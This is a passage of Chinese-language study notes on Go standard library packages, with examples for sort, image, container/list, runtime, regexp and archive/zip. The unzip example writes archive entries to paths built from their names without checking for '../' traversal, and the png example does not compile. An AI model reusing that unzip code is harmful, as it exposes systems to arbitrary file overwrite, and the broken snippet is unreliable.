<h4 id="2-降序"><a href="#2-降序" class="headerlink" title="2) 降序"></a>2) 降序</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;sort&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	testArr := []<span class="type">int</span>&#123;<span class="number">2</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">8</span>&#125;</span><br><span class="line"></span><br><span class="line">	sort.Sort(sort.Reverse(sort.IntSlice(testArr)))</span><br><span class="line">	fmt.Println(testArr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>解释一下上面的代码，<code>sort.IntSlice(testArr)</code>是将<code>[]int</code>强转成<code>sort.IntSlice</code>类型，类型定义了sort需要的三个函数，本质上还是<code>[]int</code></li>
<li><code>sort.IntSlice</code>是<code>sort.Interface</code>的一个子类实现</li>
<li><code>sort.Reverse(xxx)</code>将传入的<code>sort.Interface</code>转成<code>sort.reverse</code>类型返回</li>
<li>同样<code>sort.reverse</code>也是<code>sort.Interface</code>的一个子类实现，将<code>Less()</code>方法重写，反着调用原方法</li>
<li><code>sort.Sort()</code>将<code>sort.Interface</code>进行排序</li>
</ul>
<h3 id="14-2-二分查找"><a href="#14-2-二分查找" class="headerlink" title="14.2. 二分查找"></a>14.2. 二分查找</h3><h4 id="1-普通类型"><a href="#1-普通类型" class="headerlink" title="1) 普通类型"></a>1) 普通类型</h4><ul>
<li>sort包提供两个函数进行二分查找，并提供了一些基本类型的查找</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;sort&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	a := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 二分查找从最左边开始的第一个满足条件的索引</span></span><br><span class="line">	fmt.Println(sort.Search(<span class="built_in">len</span>(a), <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> <span class="type">bool</span> &#123; <span class="keyword">return</span> a[i] &gt;= <span class="number">2</span> &#125;)) <span class="comment">// 1</span></span><br><span class="line">	<span class="comment">// 二分查找从最左边开始第一个 func(i) &lt;= 0 的索引，并返回对应索引是否 func(i) == 0</span></span><br><span class="line">	fmt.Println(sort.Find(<span class="built_in">len</span>(a), <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> <span class="type">int</span> &#123; <span class="keyword">return</span> <span class="number">3</span> - a[i] &#125;)) <span class="comment">// 3, false</span></span><br><span class="line">	<span class="comment">// 基本类型可以直接调用，但是只支持升序的slice</span></span><br><span class="line">	<span class="comment">// 源码就是调用 sort.Search(len(a), func(i int) bool &#123; return a[i] &gt;= 2 &#125;</span></span><br><span class="line">	fmt.Println(sort.SearchInts(a, <span class="number">2</span>)) <span class="comment">// 1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-字符串使用strings-Compare"><a href="#2-字符串使用strings-Compare" class="headerlink" title="2) 字符串使用strings.Compare()"></a>2) 字符串使用<code>strings.Compare()</code></h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	all := []<span class="type">string</span>&#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 升序</span></span><br><span class="line">	sort.Slice(all, <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="type">int</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> strings.Compare(all[i], all[j]) &lt; <span class="number">0</span></span><br><span class="line">	&#125;)</span><br><span class="line">	fmt.Println(all)</span><br><span class="line">	fmt.Println(sort.Find(<span class="built_in">len</span>(all), <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">		<span class="comment">// 升序，要查找的字符串放前面</span></span><br><span class="line">		<span class="keyword">return</span> strings.Compare(<span class="string">&quot;c&quot;</span>, all[i])</span><br><span class="line">	&#125;))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 降序</span></span><br><span class="line">	sort.Slice(all, <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="type">int</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> strings.Compare(all[i], all[j]) &gt; <span class="number">0</span></span><br><span class="line">	&#125;)</span><br><span class="line">	fmt.Println(all)</span><br><span class="line">	fmt.Println(sort.Find(<span class="built_in">len</span>(all), <span class="function"><span class="keyword">func</span><span class="params">(i <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">		<span class="comment">// 降序，要查找的字符串放后面</span></span><br><span class="line">		<span class="keyword">return</span> strings.Compare(all[i], <span class="string">&quot;c&quot;</span>)</span><br><span class="line">	&#125;))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="14-3-任意类型的slice排序"><a href="#14-3-任意类型的slice排序" class="headerlink" title="14.3. 任意类型的slice排序"></a>14.3. 任意类型的slice排序</h3><h4 id="1-数字类型"><a href="#1-数字类型" class="headerlink" title="1) 数字类型"></a>1) 数字类型</h4><ul>
<li>直接使用<code>sort.Slice</code>排序，需要实现Less的函数</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> item <span class="keyword">struct</span> &#123;</span><br><span class="line">	val, count <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line">itemSlice := <span class="built_in">make</span>([]item, <span class="number">10</span>)</span><br><span class="line">...</span><br><span class="line"><span class="comment">// 为true，i向前；false，j向前。要满足相等时返回false</span></span><br><span class="line">sort.Slice(itemSlice, <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="type">int</span>)</span></span> <span class="type">bool</span> &#123; <span class="keyword">return</span> itemSlice[i].val &lt; itemSlice[j].val &#125;)</span><br></pre></td></tr></table></figure>

<h4 id="2-字符串类型"><a href="#2-字符串类型" class="headerlink" title="2) 字符串类型"></a>2) 字符串类型</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	all := []<span class="type">string</span>&#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>&#125;</span><br><span class="line">	sort.Slice(all, <span class="function"><span class="keyword">func</span><span class="params">(i, j <span class="type">int</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">		<span class="comment">// 升序就是小于0</span></span><br><span class="line">		<span class="comment">// 降序就是大于0</span></span><br><span class="line">		<span class="keyword">return</span> strings.Compare(all[i], all[j]) &lt; <span class="number">0</span></span><br><span class="line">	&#125;)</span><br><span class="line">	fmt.Println(all)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="14-4-自定义类型排序"><a href="#14-4-自定义类型排序" class="headerlink" title="14.4. 自定义类型排序"></a>14.4. 自定义类型排序</h3><ul>
<li>需要定义一个类型的三个接口，然后调用<code>sort.Sort</code>即可</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> NameSlice <span class="keyword">struct</span> &#123;</span><br><span class="line">	names   []<span class="type">string</span></span><br><span class="line">	heights []<span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(x NameSlice)</span></span> Len() <span class="type">int</span>           &#123; <span class="keyword">return</span> <span class="built_in">len</span>(x.names) &#125;</span><br><span class="line"><span class="comment">// 为true，i向前；false，j向前。要满足相等时返回false</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(x NameSlice)</span></span> Less(i, j <span class="type">int</span>) <span class="type">bool</span> &#123; <span class="keyword">return</span> x.heights[i] &gt; x.heights[j] &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(x NameSlice)</span></span> Swap(i, j <span class="type">int</span>) &#123;</span><br><span class="line">	x.heights[i], x.heights[j] = x.heights[j], x.heights[i]</span><br><span class="line">	x.names[i], x.names[j] = x.names[j], x.names[i]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sortPeople</span><span class="params">(names []<span class="type">string</span>, heights []<span class="type">int</span>)</span></span> []<span class="type">string</span> &#123;</span><br><span class="line">	tmp := NameSlice&#123;</span><br><span class="line">		names:   names,</span><br><span class="line">		heights: heights,</span><br><span class="line">	&#125;</span><br><span class="line">	sort.Sort(tmp)</span><br><span class="line">	<span class="keyword">return</span> tmp.names</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="14-5-sort内置类型"><a href="#14-5-sort内置类型" class="headerlink" title="14.5. sort内置类型"></a>14.5. sort内置类型</h3><ul>
<li>sort内置了几个基本类型的slice，实现了几个方法，可以直接用，如IntSlice</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /usr/lib/go/src/sort/sort.go</span></span><br><span class="line"><span class="comment">// IntSlice attaches the methods of Interface to []int, sorting in increasing order.</span></span><br><span class="line"><span class="keyword">type</span> IntSlice []<span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(x IntSlice)</span></span> Len() <span class="type">int</span>           &#123; <span class="keyword">return</span> <span class="built_in">len</span>(x) &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(x IntSlice)</span></span> Less(i, j <span class="type">int</span>) <span class="type">bool</span> &#123; <span class="keyword">return</span> x[i] &lt; x[j] &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(x IntSlice)</span></span> Swap(i, j <span class="type">int</span>)      &#123; x[i], x[j] = x[j], x[i] &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sort is a convenience method: x.Sort() calls Sort(x).</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(x IntSlice)</span></span> Sort() &#123; Sort(x) &#125;</span><br></pre></td></tr></table></figure>

<h2 id="15-image-图像库"><a href="#15-image-图像库" class="headerlink" title="15. image 图像库"></a>15. image 图像库</h2><h3 id="15-1-png处理"><a href="#15-1-png处理" class="headerlink" title="15.1. png处理"></a>15.1. png处理</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;image&quot;</span></span><br><span class="line">	<span class="string">&quot;image/color&quot;</span></span><br><span class="line">	<span class="string">&quot;image/png&quot;</span>		<span class="comment">// 包含这个才能解析png图片</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	originByte, _ := ioutil.ReadFile(<span class="string">&quot;./test.png&quot;</span>)</span><br><span class="line">	originBuffer := bytes.NewBuffer(originByte)</span><br><span class="line">	originImg, filename, err := image.Decode(originBuffer)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err.Error()</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(filename)	<span class="comment">// png</span></span><br><span class="line">	imgBounds := img.Bounds()</span><br><span class="line">	imgX := imgBounds.Dx()		<span class="comment">// 宽度</span></span><br><span class="line">	imgY := imgBounds.Dy()		<span class="comment">// 高度</span></span><br><span class="line"></span><br><span class="line">	firstRgba := img.At(<span class="number">0</span>, <span class="number">0</span>)	<span class="comment">// 获取一个位置的像素点</span></span><br><span class="line">	r, g, b, a := firstRgba.RGBA()</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建一个新的图片，范围是100x100</span></span><br><span class="line">	newImg := image.NewRGBA(image.Rectangle&#123;</span><br><span class="line">		Min: image.Point&#123;X: <span class="number">0</span>, Y: <span class="number">0</span>&#125;,</span><br><span class="line">		Max: image.Point&#123;X: <span class="number">100</span>, Y: <span class="number">100</span>&#125;,</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="comment">// 坐标 (5, 5) 涂黑</span></span><br><span class="line">	newImg.SetRGBA(<span class="number">5</span>, <span class="number">5</span>, color.RGBA&#123;</span><br><span class="line">		R: <span class="number">0</span>,</span><br><span class="line">		B: <span class="number">0</span>,</span><br><span class="line">		G: <span class="number">0</span>,</span><br><span class="line">		A: <span class="number">255</span>,		<span class="comment">// 不透明</span></span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 保存到output.png</span></span><br><span class="line">	f, _ := os.Create(<span class="string">&quot;./output.png&quot;</span>)</span><br><span class="line">	png.Encode(f, newImg)</span><br><span class="line">	<span class="keyword">defer</span> f.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="16-container-list-双向链表"><a href="#16-container-list-双向链表" class="headerlink" title="16. container&#x2F;list 双向链表"></a>16. container&#x2F;list 双向链表</h2><ul>
<li>value可以是任意类型的值</li>
<li><strong><font color="red">list本身不能拷贝，因为里面的element有一个指针指向root的地址，如果拷贝，root会被复制一份，将会导致element失效</font></strong></li>
<li>需要将list放到结构体时，建议使用指针放置</li>
</ul>
<h3 id="16-1-基本操作"><a href="#16-1-基本操作" class="headerlink" title="16.1. 基本操作"></a>16.1. 基本操作</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化</span></span><br><span class="line">tmp := list.New()</span><br><span class="line">tmp.PushBack(<span class="number">1</span>)  <span class="comment">// 向后插入</span></span><br><span class="line">tmp.PushFront(<span class="number">3</span>) <span class="comment">// 向前插入</span></span><br><span class="line"><span class="comment">// 遍历</span></span><br><span class="line"><span class="keyword">for</span> e := tmp.Front(); e != <span class="literal">nil</span>; e = e.Next() &#123;</span><br><span class="line">	fmt.Println(e.Value)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 删除</span></span><br><span class="line"><span class="keyword">for</span> e := tmp.Front(); e != <span class="literal">nil</span>; e = e.Next() &#123;</span><br><span class="line">	<span class="keyword">if</span> e.Value == <span class="number">3</span> &#123;</span><br><span class="line">		tmp.Remove(e)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 中间插入</span></span><br><span class="line"><span class="keyword">for</span> e := tmp.Front(); e != <span class="literal">nil</span>; e = e.Next() &#123;</span><br><span class="line">	<span class="keyword">if</span> e.Value == <span class="number">3</span> &#123;</span><br><span class="line">		<span class="comment">// 向后插入</span></span><br><span class="line">		tmp.InsertAfter(<span class="number">1</span>, e)</span><br><span class="line">		<span class="comment">// 向前插入</span></span><br><span class="line">		tmp.InsertBefore(<span class="number">2</span>, e)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h3><h4 id="1-list放到结构体里面一定要注意结构体拷贝的问题，建议在结构体里面使用指针"><a href="#1-list放到结构体里面一定要注意结构体拷贝的问题，建议在结构体里面使用指针" class="headerlink" title="1) list放到结构体里面一定要注意结构体拷贝的问题，建议在结构体里面使用指针"></a>1) list放到结构体里面一定要注意结构体拷贝的问题，建议在结构体里面使用指针</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> test <span class="keyword">struct</span> &#123;</span><br><span class="line">	head list.List</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	tmp := test&#123;&#125;</span><br><span class="line">	tmp.head.PushFront(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	tmp2 := tmp	<span class="comment">// 拷贝会导致里面的元素的root指向错误，导致下面的插入语句错误</span></span><br><span class="line">	tmp2.head.InsertAfter(<span class="number">2</span>, tmp2.head.Front())</span><br><span class="line">	<span class="comment">// 这里打印只有一个1，前面的插入失效</span></span><br><span class="line">	<span class="keyword">for</span> e := tmp2.head.Front(); e != <span class="literal">nil</span>; e = e.Next() &#123;</span><br><span class="line">		fmt.Println(e.Value)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>原因从源码查看</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// src/container/list/list.go</span></span><br><span class="line"><span class="comment">// Element is an element of a linked list.</span></span><br><span class="line"><span class="keyword">type</span> Element <span class="keyword">struct</span> &#123;</span><br><span class="line">	<span class="comment">// Next and previous pointers in the doubly-linked list of elements.</span></span><br><span class="line">	<span class="comment">// To simplify the implementation, internally a list l is implemented</span></span><br><span class="line">	<span class="comment">// as a ring, such that &amp;l.root is both the next element of the last</span></span><br><span class="line">	<span class="comment">// list element (l.Back()) and the previous element of the first list</span></span><br><span class="line">	<span class="comment">// element (l.Front()).</span></span><br><span class="line">	next, prev *Element</span><br><span class="line"></span><br><span class="line">	<span class="comment">// The list to which this element belongs.</span></span><br><span class="line">	list *List</span><br><span class="line"></span><br><span class="line">	<span class="comment">// The value stored with this element.</span></span><br><span class="line">	Value any</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// List represents a doubly linked list.</span></span><br><span class="line"><span class="comment">// The zero value for List is an empty list ready to use.</span></span><br><span class="line"><span class="keyword">type</span> List <span class="keyword">struct</span> &#123;</span><br><span class="line">	root Element <span class="comment">// sentinel list element, only &amp;root, root.prev, and root.next are used</span></span><br><span class="line">	<span class="built_in">len</span>  <span class="type">int</span>     <span class="comment">// current list length excluding (this) sentinel element</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// InsertAfter inserts a new element e with value v immediately after mark and returns e.</span></span><br><span class="line"><span class="comment">// If mark is not an element of l, the list is not modified.</span></span><br><span class="line"><span class="comment">// The mark must not be nil.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *List)</span></span> InsertAfter(v any, mark *Element) *Element &#123;</span><br><span class="line">	<span class="keyword">if</span> mark.list != l &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// see comment in List.Remove about initialization of l</span></span><br><span class="line">	<span class="keyword">return</span> l.insertValue(v, mark)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>上面的Element里面有一个变量list指向root的地址，也就是下面InsertAfter判断的值</li>
<li>当进行了拷贝之后，root本身是拷贝的，地址处于新的地址上，里面的元素的list还指向拷贝前的地址，自然和当前不相等，就会插入失败</li>
<li>解决办法就是使用指针，这样拷贝的是指针，里面的内容不会变化</li>
<li>上面的写法只是实例，实际场景经常会出现在构造函数构造完元素后返回了一个拷贝，如下面的错误写法</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Allocator <span class="keyword">struct</span> &#123;</span><br><span class="line">	memMap  list.List</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Constructor</span><span class="params">(n <span class="type">int</span>)</span></span> Allocator &#123;</span><br><span class="line">	res := Allocator&#123;&#125;</span><br><span class="line">	res.memMap.PushFront(<span class="number">1</span>)</span><br><span class="line">	<span class="comment">// 返回拷贝，外层拷贝时将memMap的内容拷贝过去，导致元素的list失效</span></span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="17-runtime-一些运行需要的变量和方法"><a href="#17-runtime-一些运行需要的变量和方法" class="headerlink" title="17. runtime 一些运行需要的变量和方法"></a>17. runtime 一些运行需要的变量和方法</h2><h3 id="17-1-常用变量"><a href="#17-1-常用变量" class="headerlink" title="17.1. 常用变量"></a>17.1. 常用变量</h3><h4 id="1-runtime-GOOS-操作系统类型"><a href="#1-runtime-GOOS-操作系统类型" class="headerlink" title="1) runtime.GOOS 操作系统类型"></a>1) runtime.GOOS 操作系统类型</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">switch</span> runtime.GOOS &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;windows&quot;</span>:</span><br><span class="line">		fmt.Println(<span class="string">&quot;windows&quot;</span>)</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;linux&quot;</span>:</span><br><span class="line">		fmt.Println(<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;darwin&quot;</span>:</span><br><span class="line">		fmt.Println(<span class="string">&quot;mac&quot;</span>)</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		log.Fatalln(<span class="string">&quot;unsupported os&quot;</span>, runtime.GOOS)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="18-io-io相关操作"><a href="#18-io-io相关操作" class="headerlink" title="18. io io相关操作"></a>18. io io相关操作</h2><h2 id="19-regexp-正则库"><a href="#19-regexp-正则库" class="headerlink" title="19. regexp 正则库"></a>19. regexp 正则库</h2><h3 id="19-1-提取字符串"><a href="#19-1-提取字符串" class="headerlink" title="19.1. 提取字符串"></a>19.1. 提取字符串</h3><ul>
<li>括号内的是要提取的字符串，输出为整体匹配到的字符串加括号匹配的字符串</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestRegexDefault</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">	line := <span class="string">&quot;[2022-12-26 18:49:24.631][ 25160:  6372][ info][aaa][bbb]testhhh\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">	defaultRegexStr := <span class="string">`^\[(20[0-9]&#123;2&#125;-[0-9]&#123;2&#125;-[0-9]&#123;2&#125; [0-9]&#123;2&#125;:[0-9]&#123;2&#125;:[0-9]&#123;2&#125;\.[0-9]&#123;3&#125;)\]\[[ ]*(\w+):[ ]*(\w+)\]\[[ ]*(\w+)\]\[(\w+)\]\[[^\]]*\](.*)`</span></span><br><span class="line">	matchRegex := regexp.MustCompile(defaultRegexStr)</span><br><span class="line">	params := matchRegex.FindStringSubmatch(line)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(params) == <span class="number">0</span> &#123;</span><br><span class="line">		t.Fatal(defaultRegexStr, <span class="string">&quot; parse failed, params &quot;</span>, params)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(params)	<span class="comment">// [&quot;[2022-12-26 18:49:24.631][ 25160:  6372][ info][aaa][bbb]testhhh\r&quot; &quot;2022-12-26&quot; &quot;18:49:24.631&quot; &quot;25160&quot; &quot;6372&quot; &quot;info&quot; &quot;aaa&quot; &quot;testhhh&quot;]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="20-archive-zip-zip相关操作"><a href="#20-archive-zip-zip相关操作" class="headerlink" title="20. archive&#x2F;zip zip相关操作"></a>20. archive&#x2F;zip zip相关操作</h2><h3 id="20-1-解压缩"><a href="#20-1-解压缩" class="headerlink" title="20.1. 解压缩"></a>20.1. 解压缩</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">unzip</span><span class="params">(zipFile <span class="type">string</span>, destDir <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	zipReader, err := zip.OpenReader(zipFile)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> zipReader.Close()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, f := <span class="keyword">range</span> zipReader.File &#123;</span><br><span class="line">		fpath := filepath.Join(destDir, f.Name)</span><br><span class="line">		<span class="keyword">if</span> f.FileInfo().IsDir() &#123;</span><br><span class="line">			os.MkdirAll(fpath, os.ModePerm)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> err = os.MkdirAll(filepath.Dir(fpath), os.ModePerm); err != <span class="literal">nil</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> err</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			inFile, err := f.Open()</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> err</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">defer</span> inFile.Close()</span><br><span class="line"></span><br><span class="line">			outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> err</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">defer</span> outFile.Close()</span><br><span class="line"></span><br><span class="line">			_, err = io.Copy(outFile, inFile)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> err</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="20-2-压缩"><a href="#20-2-压缩" class="headerlink" title="20.2. 压缩"></a>20.2. 压缩</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// srcFile could be a single file or a directory</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Zip</span><span class="params">(srcFile <span class="type">string</span>, destZip <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    zipfile, err := os.Create(destZip)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> zipfile.Close()</span><br><span class="line"></span><br><span class="line">    archive := zip.NewWriter(zipfile)</span><br><span class="line">    <span class="keyword">defer</span> archive.Close()</span><br><span class="line"></span><br><span class="line">    filepath.Walk(srcFile, <span class="function"><span class="keyword">func</span><span class="params">(path <span class="type">string</span>, info os.FileInfo, err <span class="type">error</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        header, err := zip.FileInfoHeader(info)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        header.Name = strings.TrimPrefix(path, filepath.Dir(srcFile) + <span class="string">&quot;/&quot;</span>)</span><br><span class="line">        <span class="comment">// header.Name = path</span></span><br><span class="line">        <span class="keyword">if</span> info.IsDir() &#123;</span><br><span class="line">            header.Name += <span class="string">&quot;/&quot;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            header.Method = zip.Deflate</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        writer, err := archive.CreateHeader(header)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ! info.IsDir() &#123;</span><br><span class="line">            file, err := os.Open(path)</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> err</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">defer</span> file.Close()</span><br><span class="line">            _, err = io.Copy(writer, file)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> err</span><br><span 